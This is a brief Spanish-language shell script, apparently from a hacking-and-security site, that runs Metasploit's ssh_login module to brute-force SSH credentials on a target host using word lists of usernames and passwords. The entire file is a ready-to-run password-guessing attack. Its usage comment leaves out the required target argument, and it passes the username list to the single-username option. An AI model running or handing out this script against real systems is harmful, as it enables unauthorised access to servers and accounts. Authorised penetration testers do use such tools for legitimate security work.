#!/bin/sh
# Script compatible con Bash antiguo (1.x) para fuerza bruta SSH con Metasploit
# Uso: ./brutessh9.sh

echo
echo "Ataque fuerza bruta con Meta Exploit"
echo
echo "(R) http://www.hackingyseguridad.com/ 2025"
echo
echo "Iniciando ataque de fuerza bruta SSH contra $1"
echo
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS $1; set USERNAME usuarios0.txt; set PASS_FILE claves0.txt; run; exit"

echo "..."
